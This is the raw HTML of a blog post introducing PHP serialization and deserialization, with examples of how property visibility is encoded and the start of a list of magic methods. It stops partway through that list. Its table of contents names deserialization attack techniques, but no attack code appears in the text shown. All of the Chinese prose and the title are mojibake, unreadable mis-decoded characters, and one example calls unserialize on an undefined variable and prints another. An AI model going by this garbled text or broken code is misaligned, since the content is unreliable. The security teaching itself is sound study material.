<!DOCTYPE html><html lang="[&quot;en&quot;,&quot;zh-CN&quot;,&quot;default&quot;]"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Npc"><meta name="copyright" content="Npc"><meta name="generator" content="Hexo 7.1.1"><meta name="theme" content="hexo-theme-yun"><title>åˆè¯†PHPååºåˆ—åŒ– | Npc | Blog</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/line-numbers/prism-line-numbers.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/my_blog_prism@1.0.5/prism.css"><script src="https://cdn.jsdelivr.net/npm/my_blog_prism@1.0.5/prism.js"></script><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"npc0vo.github.io","root":"/","title":"Npcå°ç«™","version":"1.10.11","mode":"light","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"fireworks":{"colors":null},"waline":{"config":{"enable":true,"serverURL":"https://waline-onelastchicks-projects.vercel.app/","comment":false,"el":"#waline","lang":["en","zh-CN","default"]},"cdn":"https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.js","dark":"html.dark"},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="preconnect" href="https://www.google-analytics.com" crossorigin><script async src="https://www.googletagmanager.com/gtag/js?id=G-1LL0D86CY9"></script><script>if (CONFIG.hostname === location.hostname) {
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'G-1LL0D86CY9');
}</script><script data-ad-client="ca-pub-2245427233262012" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(function(){
  var bp = document.createElement('script');
  var curProtocol = window.location.protocol.split(':')[0];
  if (curProtocol === 'https') {
    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
  }
  else {
    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
  }
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(bp, s);
})();</script><!-- Google Tag Manager --><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-M9KWR9L');</script><!-- End Google Tag Manager --><meta name="description" content="æ¦‚å¿µ  åºåˆ—åŒ–å’Œååºåˆ—åŒ– åºåˆ—åŒ–ç¤ºä¾‹ &lt;?php  class test&#123;      public $name &#x3D; &#39;P2hm1n&#39;;        private $sex &#x3D; &#39;secret&#39;;        protected $age &#x3D; &#39;20&#39;;  &#125;  $test1 &#x3D; new test();  $object &#x3D; serialize($test1);">
<meta property="og:type" content="article">
<meta property="og:title" content="åˆè¯†PHPååºåˆ—åŒ–">
<meta property="og:url" content="http://npc0vo.github.io/2024/07/01/%E5%88%9D%E8%AF%86PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
<meta property="og:site_name" content="Npc | Blog">
<meta property="og:description" content="æ¦‚å¿µ  åºåˆ—åŒ–å’Œååºåˆ—åŒ– åºåˆ—åŒ–ç¤ºä¾‹ &lt;?php  class test&#123;      public $name &#x3D; &#39;P2hm1n&#39;;        private $sex &#x3D; &#39;secret&#39;;        protected $age &#x3D; &#39;20&#39;;  &#125;  $test1 &#x3D; new test();  $object &#x3D; serialize($test1);">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://npc0vo.github.io/2024/07/01/%E5%88%9D%E8%AF%86PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240703165137530.png">
<meta property="og:image" content="http://npc0vo.github.io/2024/07/01/%E5%88%9D%E8%AF%86PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240703181936938.png">
<meta property="og:image" content="http://npc0vo.github.io/2024/07/01/%E5%88%9D%E8%AF%86PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240703192958671.png">
<meta property="article:published_time" content="2024-07-01T14:39:21.000Z">
<meta property="article:modified_time" content="2024-07-03T12:05:15.674Z">
<meta property="article:author" content="Npc">
<meta property="article:tag" content="Web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://npc0vo.github.io/2024/07/01/%E5%88%9D%E8%AF%86PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240703165137530.png"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="Table of Contents"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="Overview"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Npc"><img width="96" loading="lazy" src="/images/avatar.jpg" alt="Npc"><span class="site-author-status">ğŸ˜­</span></a><div class="site-author-name"><a href="/about/">Npc</a></div><span class="site-name">Npc | Blog</span><sub class="site-subtitle">æƒ³s</sub><div class="site-description"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="Home"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="Archives"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">45</span></a></div><div class="site-state-item"><a href="/categories/" title="Categories"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">9</span></a></div><div class="site-state-item"><a href="/tags/" title="Tags"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">12</span></a></div><a class="site-state-item hty-icon-button" href="/about/#comment" title="ç•™è¨€æ¿"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:clipboard-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/npc0vo" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:me@1930278836@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:mail-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="æˆ‘çš„å°ä¼™ä¼´ä»¬" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-number">1.</span> <span class="toc-text"> æ¦‚å¿µ</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.1.</span> <span class="toc-text"> åºåˆ—åŒ–å’Œååºåˆ—åŒ–</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%A7%E7%94%9F%E5%8E%9F%E5%9B%A0"><span class="toc-number">1.2.</span> <span class="toc-text"> äº§ç”ŸåŸå› </span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#php%E7%9A%84%E9%AD%94%E6%B3%95%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.1.</span> <span class="toc-text"> PHPçš„é­”æ³•æ–¹æ³•</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB"><span class="toc-number">2.</span> <span class="toc-text"> å¸¸è§æ”»å‡»</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%981"><span class="toc-number">2.1.</span> <span class="toc-text"> ä¾‹é¢˜1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#__wakeup%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.</span> <span class="toc-text"> __wakeup()å‡½æ•°ç»•è¿‡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8"><span class="toc-number">2.3.</span> <span class="toc-text"> ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">2.3.1.</span> <span class="toc-text"> å‰ç½®çŸ¥è¯†ï¼š</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E6%9B%BF%E6%8D%A2%E4%BF%AE%E6%94%B9%E5%90%8E%E5%AF%BC%E8%87%B4%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%98%E9%95%BF"><span class="toc-number">2.3.2.</span> <span class="toc-text"> ä¸€æ›¿æ¢ä¿®æ”¹åå¯¼è‡´åºåˆ—åŒ–å­—ç¬¦ä¸²å˜é•¿</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E6%9B%BF%E6%8D%A2%E4%B9%8B%E5%90%8E%E5%AF%BC%E8%87%B4%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%98%E7%9F%AD"><span class="toc-number">2.3.3.</span> <span class="toc-text"> äºŒæ›¿æ¢ä¹‹åå¯¼è‡´åºåˆ—åŒ–å­—ç¬¦ä¸²å˜çŸ­</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.4.</span> <span class="toc-text"> pharååºåˆ—åŒ–</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-2"><span class="toc-number">2.4.1.</span> <span class="toc-text"> å‰ç½®çŸ¥è¯†</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.4.2.</span> <span class="toc-text"> åˆ©ç”¨æ¡ä»¶</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E5%87%BD%E6%95%B0"><span class="toc-number">2.4.3.</span> <span class="toc-text"> æ–‡ä»¶æ“ä½œå‡½æ•°</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">2.4.4.</span> <span class="toc-text"> ç»•è¿‡æ–¹æ³•</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.5.</span> <span class="toc-text"> sessionååºåˆ—åŒ–</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%80%A0%E6%88%90%E5%8E%9F%E7%90%86"><span class="toc-number">2.5.1.</span> <span class="toc-text"> æ¼æ´é€ æˆåŸç†ï¼š</span></a></li></ol></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="http://npc0vo.github.io/2024/07/01/%E5%88%9D%E8%AF%86PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Npc"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Npc | Blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">åˆè¯†PHPååºåˆ—åŒ–</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="Created: 2024-07-01 22:39:21" itemprop="dateCreated datePublished" datetime="2024-07-01T22:39:21+08:00">2024-07-01</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="Modified: 2024-07-03 20:05:15" itemprop="dateModified" datetime="2024-07-03T20:05:15+08:00">2024-07-03</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="Word count in article"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="Word count in article">5.3k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="Reading time"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="Reading time">21m</span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/Web/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">Web</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/Web/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">Web</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h2 id="æ¦‚å¿µ"><a class="markdownIt-Anchor" href="#æ¦‚å¿µ"></a> æ¦‚å¿µ</h2>
<h3 id="åºåˆ—åŒ–å’Œååºåˆ—åŒ–"><a class="markdownIt-Anchor" href="#åºåˆ—åŒ–å’Œååºåˆ—åŒ–"></a> åºåˆ—åŒ–å’Œååºåˆ—åŒ–</h3>
<p>åºåˆ—åŒ–ç¤ºä¾‹</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">test</span><span class="token punctuation">&#123;</span>

    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'P2hm1n'</span><span class="token punctuation">;</span>  

    <span class="token keyword">private</span> <span class="token variable">$sex</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'secret'</span><span class="token punctuation">;</span>  

    <span class="token keyword">protected</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'20'</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span>

<span class="token variable">$test1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$object</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$test1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">#O:4:"test":3:&#123;s:4:"name";s:6:"P2hm1n";s:9:"testsex";s:6:"secret";s:6:"*age";s:2:"20";&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å…³é”®å‡½æ•° serialize():å°†PHPä¸­åˆ›å»ºçš„å¯¹è±¡ï¼Œå˜æˆä¸€ä¸ªå­—ç¬¦ä¸²</p>
<p>privateå±æ€§åºåˆ—åŒ–çš„æ—¶å€™æ ¼å¼æ˜¯ %00ç±»å%00æˆå‘˜å</p>
<p>protectedå±æ€§åºåˆ—åŒ–çš„æ—¶å€™æ ¼å¼æ˜¯ %00*%00æˆå‘˜å</p>
<p>å…³é”®è¦ç‚¹ï¼š</p>
<p>åœ¨Private æƒé™ç§æœ‰å±æ€§åºåˆ—åŒ–çš„æ—¶å€™æ ¼å¼æ˜¯ %00ç±»å%00å±æ€§å</p>
<p>åœ¨Protected æƒé™åºåˆ—åŒ–çš„æ—¶å€™æ ¼å¼æ˜¯ %00*%00å±æ€§å</p>
<pre class="line-numbers language-undefined" data-language="undefined"><code class="language-undefined">è¯·è®°ä½ï¼Œåºåˆ—åŒ–åªåºåˆ—åŒ–å±æ€§ï¼Œä¸åºåˆ—åŒ–æ–¹æ³•ï¼Œè¿™ä¸ªæ€§è´¨å°±å¼•å‡ºäº†ä¸¤ä¸ªéå¸¸é‡è¦çš„è¯é¢˜ï¼š<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>(1)æˆ‘ä»¬åœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¸€å®šè¦ä¿è¯åœ¨å½“å‰çš„ä½œç”¨åŸŸç¯å¢ƒä¸‹æœ‰è¯¥ç±»å­˜åœ¨</p>
<p>è¿™é‡Œä¸å¾—ä¸æ‰¯å‡ºååºåˆ—åŒ–çš„é—®é¢˜ï¼Œè¿™é‡Œå…ˆç®€å•è¯´ä¸€ä¸‹ï¼Œååºåˆ—åŒ–å°±æ˜¯å°†æˆ‘ä»¬å‹ç¼©æ ¼å¼åŒ–çš„å¯¹è±¡è¿˜åŸæˆåˆå§‹çŠ¶æ€çš„è¿‡ç¨‹ï¼ˆå¯ä»¥è®¤ä¸ºæ˜¯è§£å‹ç¼©çš„è¿‡ç¨‹ï¼‰ï¼Œå› ä¸ºæˆ‘ä»¬æ²¡æœ‰åºåˆ—åŒ–æ–¹æ³•ï¼Œå› æ­¤åœ¨ååºåˆ—åŒ–ä»¥åæˆ‘ä»¬å¦‚æœæƒ³æ­£å¸¸ä½¿ç”¨è¿™ä¸ªå¯¹è±¡çš„è¯æˆ‘ä»¬å¿…é¡»è¦ä¾æ‰˜äºè¿™ä¸ªç±»è¦åœ¨å½“å‰ä½œç”¨åŸŸå­˜åœ¨çš„æ¡ä»¶ã€‚</p>
<p>(2)æˆ‘ä»¬åœ¨ååºåˆ—åŒ–æ”»å‡»çš„æ—¶å€™ä¹Ÿå°±æ˜¯ä¾æ‰˜ç±»å±æ€§è¿›è¡Œæ”»å‡»</p>
<p>å› ä¸ºæ²¡æœ‰åºåˆ—åŒ–æ–¹æ³•å˜›ï¼Œæˆ‘ä»¬èƒ½æ§åˆ¶çš„åªæœ‰ç±»çš„å±æ€§ï¼Œå› æ­¤ç±»å±æ€§å°±æ˜¯æˆ‘ä»¬å”¯ä¸€çš„æ”»å‡»å…¥å£ï¼Œåœ¨æˆ‘ä»¬çš„æ”»å‡»æµç¨‹ä¸­ï¼Œæˆ‘ä»¬å°±æ˜¯è¦å¯»æ‰¾åˆé€‚çš„èƒ½è¢«æˆ‘ä»¬æ§åˆ¶çš„å±æ€§ï¼Œç„¶ååˆ©ç”¨å®ƒæœ¬èº«çš„å­˜åœ¨çš„æ–¹æ³•ï¼Œåœ¨åŸºäºå±æ€§è¢«æ§åˆ¶çš„æƒ…å†µä¸‹å‘åŠ¨æˆ‘ä»¬çš„å‘åºåˆ—åŒ–æ”»å‡»ï¼ˆè¿™æ˜¯æˆ‘ä»¬æ”»å‡»çš„æ ¸å¿ƒæ€æƒ³ï¼Œè¿™é‡Œå…ˆå€Ÿæ­¤æœºä¼šæŠ›å‡ºæ¥ï¼Œå¤§å®¶æœ‰ä¸€ä¸ªå°è±¡ï¼‰</p>
<p>ååºåˆ—åŒ–ç¤ºä¾‹</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token variable">$object</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'O:4:"test":3:&#123;s:4:"name";s:6:"P2hm1n";s:9:"testsex";s:6:"secret";s:6:"*age";s:2:"20";&#125;'</span><span class="token punctuation">;</span>

<span class="token variable">$test</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$object1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$test3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å…³é”®å‡½æ•° unserialize():å°†ç»è¿‡åºåˆ—åŒ–çš„å­—ç¬¦ä¸²è½¬æ¢å›PHPå€¼</p>
<p>å½“æœ‰ protected å’Œ private å±æ€§çš„æ—¶å€™è®°å¾—è¡¥é½ç©ºçš„å­—ç¬¦ä¸²</p>
<p>__wakeup()é­”æœ¯æ–¹æ³•</p>
<p>unserialize() ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ª __wakeup() æ–¹æ³•ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™ä¼šå…ˆè°ƒç”¨ __wakeup æ–¹æ³•ï¼Œé¢„å…ˆå‡†å¤‡å¯¹è±¡éœ€è¦çš„èµ„æºã€‚</p>
<p>åºåˆ—åŒ–public private protectå‚æ•°äº§ç”Ÿä¸åŒç»“æœ</p>
<p>privateçš„å‚æ•°è¢«ååºåˆ—åŒ–åå˜æˆ \00test\00test1 publicçš„å‚æ•°å˜æˆ test2 protectedçš„å‚æ•°å˜æˆ \00*\00test3</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">test</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$test1</span><span class="token operator">=</span><span class="token string double-quoted-string">"hello"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$test2</span><span class="token operator">=</span><span class="token string double-quoted-string">"hello"</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$test3</span><span class="token operator">=</span><span class="token string double-quoted-string">"hello"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$test</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token comment">//  O:4:"test":3:&#123;s:11:" test test1";s:5:"hello";s:5:"test2";s:5:"hello";s:8:" * test3";s:5:"hello";&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="äº§ç”ŸåŸå› "><a class="markdownIt-Anchor" href="#äº§ç”ŸåŸå› "></a> äº§ç”ŸåŸå› </h3>
<p>PHP ååºåˆ—åŒ–æ¼æ´åˆå«åš PHP å¯¹è±¡æ³¨å…¥æ¼æ´ï¼Œæ˜¯å› ä¸ºç¨‹åºå¯¹è¾“å…¥æ•°æ®å¤„ç†ä¸å½“å¯¼è‡´çš„.</p>
<p>ååºåˆ—åŒ–æ¼æ´çš„æˆå› åœ¨äºä»£ç ä¸­çš„ unserialize() æ¥æ”¶çš„å‚æ•°å¯æ§ï¼Œä»ä¸Šé¢çš„ä¾‹å­çœ‹ï¼Œè¿™ä¸ªå‡½æ•°çš„å‚æ•°æ˜¯ä¸€ä¸ªåºåˆ—åŒ–çš„å¯¹è±¡ï¼Œè€Œåºåˆ—åŒ–çš„å¯¹è±¡åªå«æœ‰å¯¹è±¡çš„å±æ€§ï¼Œé‚£æˆ‘ä»¬å°±è¦åˆ©ç”¨å¯¹å¯¹è±¡å±æ€§çš„ç¯¡æ”¹å®ç°æœ€ç»ˆçš„æ”»å‡»ã€‚</p>
<p>éœ€è¦å…·å¤‡ååºåˆ—åŒ–æ¼æ´çš„å‰æï¼š</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">å¿…é¡»æœ‰ <span class="token function">unserailize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> å‡½æ•°

<span class="token function">unserailize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> å‡½æ•°çš„å‚æ•°å¿…é¡»å¯æ§ï¼ˆä¸ºäº†æˆåŠŸè¾¾åˆ°æ§åˆ¶ä½ è¾“å…¥çš„å‚æ•°æ‰€å®ç°çš„åŠŸèƒ½ï¼Œå¯èƒ½éœ€è¦ç»•è¿‡ä¸€äº›é­”æ³•å‡½æ•°<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h4 id="phpçš„é­”æ³•æ–¹æ³•"><a class="markdownIt-Anchor" href="#phpçš„é­”æ³•æ–¹æ³•"></a> PHPçš„é­”æ³•æ–¹æ³•</h4>
<p>PHP å°†æ‰€æœ‰ä»¥ __ï¼ˆä¸¤ä¸ªä¸‹åˆ’çº¿ï¼‰å¼€å¤´çš„ç±»æ–¹æ³•ä¿ç•™ä¸ºé­”æœ¯æ–¹æ³•ã€‚æ‰€ä»¥åœ¨å®šä¹‰ç±»æ–¹æ³•æ—¶ï¼Œé™¤äº†ä¸Šè¿°é­”æœ¯æ–¹æ³•ï¼Œå»ºè®®ä¸è¦ä»¥ __ ä¸ºå‰ç¼€ã€‚ å¸¸è§çš„é­”æ³•æ–¹æ³•å¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">__<span class="token function">construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼Œç±»çš„æ„é€ å‡½æ•°

__<span class="token function">destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼Œç±»çš„ææ„å‡½æ•°

__<span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼Œåœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨

__<span class="token function">callStatic</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼Œç”¨é™æ€æ–¹å¼ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨

__<span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼Œè·å¾—ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨

